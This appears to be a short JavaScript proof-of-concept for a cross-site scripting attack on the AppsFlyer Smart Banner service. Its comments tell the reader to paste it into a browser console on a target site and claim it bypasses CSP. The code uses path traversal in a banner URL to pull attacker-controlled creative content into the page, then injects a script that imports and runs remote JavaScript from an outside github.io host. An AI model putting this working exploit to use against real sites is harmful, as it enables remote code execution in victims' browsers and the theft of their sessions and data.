// AppsFlyer Smart Banner XSS — Universal Console PoC
// Paste this into DevTools Console (F12) on any target site
// Works regardless of CSP (strict-dynamic bypass via createElement)
// Replace VICTIM_KEY with the target's AppsFlyer banners key

// Usage:  AF_SB_KEY="975bd8df-385d-4212-a530-723547e35f1f"
// Then paste the one-liner below

(async (k, a) => {
  const u = new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);
  const b = (await (await fetch(u.href)).json())[0];
  const c = await (await fetch(b.creative_url)).json();
  const w = document.createElement('div');
  w.innerHTML = c.layout;
  document.body.insertBefore(w.querySelector('#smart-banner'), document.body.firstChild);
  const s = document.createElement('script');
  s.innerHTML = `import('//s1n6h.github.io/x.js')`;
  document.body.appendChild(s);
})('VICTIM_KEY', 'e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')
